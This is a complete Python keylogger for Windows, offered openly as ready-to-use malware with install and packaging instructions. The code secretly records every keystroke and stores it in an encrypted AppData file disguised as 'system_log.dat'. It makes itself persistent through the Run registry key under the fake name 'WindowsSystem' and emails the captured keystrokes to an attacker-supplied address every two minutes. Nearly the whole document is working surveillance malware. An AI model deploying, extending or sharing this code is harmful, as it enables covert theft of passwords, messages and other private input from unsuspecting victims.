'''
Description: The keylogger secretly captures keyboard input on Windows systems and reports it via email.

Requirements:
You need to install pynput, cryptography (pip install pynput cryptography). Otherwise, the script won't work.

Usage:
python Keylogger_win_final.py

IMPORTANT:
The script is designed to be run as a standalone executable using PyInstaller or similar tools

Summary:
- Runs silently in the background
- Creates encrypted log in AppData folder
- Emails captured keystrokes every 2 minutes
- Persists through system restarts

'''
from pynput import keyboard
import smtplib
import threading
import os
import winreg
import time
import sys
from cryptography.fernet import Fernet
import base64
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

log_file = os.path.join(os.getenv('APPDATA'), 'system_log.dat') #File path for logs
text = "" #Global keystroke buffer
is_initializing = True #Initialization flag
encryption_key = None #Memory-only key storage

MAIL_SERVER = 'smtp.gmail.com' #Email configuration
MAIL_PORT = 587
MAIL_USER = "ENTER YOUR EMAIL HERE" #Sender email address
MAIL_PASS = "ENTER YOUR PASSWORD HERE" #Note: Use an app password for Gmail if 2FA is enabled
RECIPIENT_EMAIL = "ENTER DESTINATION EMAIL HERE" #Recipient email address (can be the same as sender)
time_interval = 120 #Email interval in seconds

def log_message(message):
    global text
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"\n[SYSTEM {timestamp}] {message}\n"
    print(log_entry) #Console output
    text += log_entry #Add to buffer
    if not is_initializing:
        save_logs()

def generate_key():
    global encryption_key
    if encryption_key is None:
        password = b"ENTER PASSWORD" #Encryption password
        salt = os.urandom(16)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password))
        encryption_key = {
            'salt': salt,
            'key': key
        }
        print("New encryption key generated (stored in memory only)")
        return key
    else:
        print("Using existing in-memory encryption key")
        return encryption_key['key']

def get_cipher():
    key = generate_key()
    return Fernet(key)

def save_logs():
    global text
    if text:
        cipher = get_cipher()
        existing_data = b""
        if os.path.exists(log_file):
            try:
                with open(log_file, 'rb') as f:
                    encrypted_data = f.read()
                    if encrypted_data:
                        existing_data = cipher.decrypt(encrypted_data)
            except Exception as e:
                print(f"Error decrypting logs: {e}")
                pass
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S") + ": "
        combined_data = existing_data + timestamp.encode() + text.encode() + b"\n\n"
        encrypted_data = cipher.encrypt(combined_data)
        with open(log_file, 'wb') as f:
            f.write(encrypted_data)

def read_logs():
    try:
        if os.path.exists(log_file):
            cipher = get_cipher()
            with open(log_file, 'rb') as f:
                encrypted_data = f.read()
                if encrypted_data:
                    decrypted_data = cipher.decrypt(encrypted_data)
                    return decrypted_data.decode('utf-8', errors='replace')
    except Exception as e:
        print(f"Error reading logs: {e}")
        pass
    return "No logs available"

def setup_persistence():
    try:
        if getattr(sys, 'frozen', False): #If packaged with PyInstaller
            app_path = sys.executable
        else: #If running as script
            app_path = os.path.abspath(__file__)
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as registry_key:
            winreg.SetValueEx(registry_key, "WindowsSystem", 0, winreg.REG_SZ, app_path)
        print("Persistence setup successful")
        return True
    except Exception as e:
        print(f"Persistence error: {e}")
        return False

def send_email():
    global text
    try:
        save_logs() #Save before sending
        msg = MIMEMultipart()
        msg['From'] = MAIL_USER
        msg['To'] = RECIPIENT_EMAIL
        msg['Subject'] = f"System Report - {time.strftime('%Y-%m-%d %H:%M:%S')}"
        if text:
            msg.attach(MIMEText(f"Recent Keystrokes:\n\n{text}", 'plain'))
        else:
            msg.attach(MIMEText("No new keystrokes captured.", 'plain'))
        full_logs = read_logs()
        if full_logs:
            log_attachment = MIMEText(full_logs, 'plain')
            log_attachment.add_header('Content-Disposition', 'attachment', filename='full_logs.txt')
            msg.attach(log_attachment)
        server = smtplib.SMTP(MAIL_SERVER, MAIL_PORT)
        server.starttls()
        server.login(MAIL_USER, MAIL_PASS)
        server.sendmail(MAIL_USER, RECIPIENT_EMAIL, msg.as_string())
        server.quit()
        log_message("Email sent successfully")
        text = "" #Clear buffer after sending
    except Exception as e:
        log_message(f"Email error: {e}")
        pass
    timer = threading.Timer(time_interval, send_email)
    timer.daemon = True #Allow exit when timer alive
    timer.start()

def on_press(key):
    global text
    try:
        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.shift:
            pass
        elif key == keyboard.Key.backspace and len(text) == 0:
            pass
        elif key == keyboard.Key.backspace and len(text) > 0:
            text = text[:-1]
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            pass
        elif key == keyboard.Key.esc:
            pass #Don't exit on ESC
        else:
            text += str(key).strip("'") #Convert key to string
    except Exception as e:
        log_message(f"Keylogging error: {e}")
        pass
    return True #Continue collecting

def main():
    global is_initializing
    print("Keylogger starting")
    setup_persistence()
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    print("Keyboard listener started")
    is_initializing = False
    log_message("Initialization complete")
    send_email()
    log_message("Email timer initiated")
    try:
        while True:
            time.sleep(300) #Reduce CPU usage
            save_logs() #Periodic save
    except KeyboardInterrupt:
        log_message("Keylogger terminated by keyboard interrupt")
    except Exception as e:
        log_message(f"Unexpected error in main loop: {e}")

if __name__ == "__main__":
    main()